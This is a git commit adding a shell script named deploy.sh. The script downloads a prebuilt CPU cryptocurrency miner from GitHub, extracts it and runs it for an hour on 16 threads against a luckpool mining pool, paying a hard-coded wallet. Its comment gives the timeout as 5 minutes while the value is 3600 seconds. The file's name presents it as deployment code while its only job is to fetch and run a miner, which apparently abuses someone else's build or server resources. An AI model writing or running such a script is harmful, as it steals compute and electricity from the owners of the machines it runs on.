6e2e7d2476dca55774df5dc32a5db4f7ad1bf2f1
jelte504 <85855698+jelte504@users.noreply.github.com>
2021-06-14 02:42:10 +0000

    Create deploy.sh

---
+++ deploy.sh
@@ -0,0 +1,19 @@
+#!/bin/bash
+
+Timeout=3600 # 5 minutes
+
+function timeout_monitor() {
+   sleep "$Timeout"
+   kill "$1"
+}
+
+# start the timeout monitor in 
+# background and pass the PID:
+timeout_monitor "$$" &
+Timeout_monitor_pid=$!
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz
+./hellminer -c stratum+tcp://ap.luckpool.net:3957#xnsub -u RSBmzzfgzomxwx7o6tJNmG3kecq9Huc7Q9.01 -p x --cpu 16
+# <your script here>
+
+# kill timeout monitor when terminating:
+kill "$Timeout_monitor_pid"
